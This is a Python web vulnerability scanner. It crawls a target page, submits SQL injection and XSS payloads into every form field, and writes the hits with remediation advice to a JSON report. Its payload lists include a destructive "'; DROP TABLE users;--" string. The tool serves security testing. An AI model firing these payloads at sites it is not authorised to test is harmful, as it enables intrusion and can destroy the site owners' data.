import requests
from bs4 import BeautifulSoup
import re
import urllib.parse
import time
import json
import sys

class WebsiteVulnerabilityScanner:
    def __init__(self, target_url, report_file="vulnerability_report.json"):
        self.target_url = target_url
        self.report_file = report_file
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"})
        self.vulnerabilities = []
        self.forms = []
        self.links = []
        self.crawled = set()
        self.report = {}

    def crawl_website(self, url):
        try:
            response = self.session.get(url, timeout=5)
            response.raise_for_status()
            soup = BeautifulSoup(response.content, 'html.parser')

            self.extract_forms(soup, url)
            self.extract_links(soup, url)

        except requests.exceptions.RequestException as e:
            print(f"Error crawling {url}: {e}")
            return

    def extract_forms(self, soup, url):
        forms = soup.find_all('form')
        for form in forms:
            form_details = {
                "action": form.attrs.get("action"),
                "method": form.attrs.get("method", "get").lower(),
                "inputs": []
            }
            for input_field in form.find_all("input"):
                input_details = {
                    "type": input_field.attrs.get("type", "text"),
                    "name": input_field.attrs.get("name"),
                    "value": input_field.attrs.get("value", "")
                }
                form_details["inputs"].append(input_details)
            self.forms.append({"url": url, "form": form_details})

    def extract_links(self, soup, url):
        for a_tag in soup.find_all('a', href=True):
            href = a_tag.attrs['href']
            absolute_url = urllib.parse.urljoin(url, href)
            parsed_url = urllib.parse.urlparse(absolute_url)
            absolute_url = parsed_url.scheme + "://" + parsed_url.netloc + parsed_url.path
            if absolute_url.startswith(self.target_url) and absolute_url not in self.crawled:
                self.links.append(absolute_url)
                self.crawled.add(absolute_url)

    def sqli_test(self, form_details):
         sqli_payloads = ["' OR '1'='1", '" OR "1"="1', "'; DROP TABLE users;--"]

         for payload in sqli_payloads:
            data = {}
            for input_field in form_details["form"]["inputs"]:
                 if input_field["type"] == "hidden":
                     data[input_field["name"]] = input_field["value"]
                 elif input_field["name"]:
                     data[input_field["name"]] = payload
            
            url = urllib.parse.urljoin(form_details["url"], form_details["form"]["action"])
            try:
                if form_details["form"]["method"] == "post":
                    response = self.session.post(url, data=data, timeout=5)
                else:
                    response = self.session.get(url, params=data, timeout=5)

                response.raise_for_status()

                if re.search(r"SQL syntax|MySQL|MariaDB|SQLSTATE", response.text, re.IGNORECASE):
                    self.vulnerabilities.append({
                         "url": url,
                         "vulnerability": "SQL Injection",
                         "payload": payload,
                         "method": form_details["form"]["method"],
                         "data": data,
                         "remediation": "Use parameterized queries or prepared statements.  Sanitize user inputs.  Implement least privilege principle for database access.",
                         "severity": "Critical"
                    })

            except requests.exceptions.RequestException as e:
                print(f"Error during SQLi test on {url}: {e}")

    def xss_test(self, form_details):
         xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "\"><script>alert('XSS')</script>"]
         
         for payload in xss_payloads:
            data = {}
            for input_field in form_details["form"]["inputs"]:
                if input_field["type"] == "hidden":
                    data[input_field["name"]] = input_field["value"]
                elif input_field["name"]:
                    data[input_field["name"]] = payload

            url = urllib.parse.urljoin(form_details["url"], form_details["form"]["action"])
            try:
                if form_details["form"]["method"] == "post":
                    response = self.session.post(url, data=data, timeout=5)
                else:
                    response = self.session.get(url, params=data, timeout=5)
                response.raise_for_status()

                if payload in response.text:
                    self.vulnerabilities.append({
                        "url": url,
                        "vulnerability": "XSS",
                        "payload": payload,
                        "method": form_details["form"]["method"],
                        "data": data,
                        "remediation": "Encode output. Sanitize input.  Use a Content Security Policy (CSP).",
                        "severity": "High"
                    })
            except requests.exceptions.RequestException as e:
                print(f"Error during XSS test on {url}: {e}")

    def perform_attacks(self):
        for form in self.forms:
            self.sqli_test(form)
            self.xss_test(form)

    def run_scanner(self):
        self.crawl_website(self.target_url)
        print(f"Crawling finished. Found {len(self.links)} links and {len(self.forms)} forms.")
        self.perform_attacks()
        self.generate_report()

    def generate_report(self):
        self.report["target_url"] = self.target_url
        self.report["scan_time"] = time.strftime("%Y-%m-%d %H:%M:%S")
        self.report["vulnerabilities"] = self.vulnerabilities

        with open(self.report_file, "w") as f:
            json.dump(self.report, f, indent=4)
        print(f"Scan completed. Vulnerability report saved to {self.report_file}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python scanner.py <target_url>")
        sys.exit(1)

    target_url = sys.argv[1]
    scanner = WebsiteVulnerabilityScanner(target_url)
    scanner.run_scanner()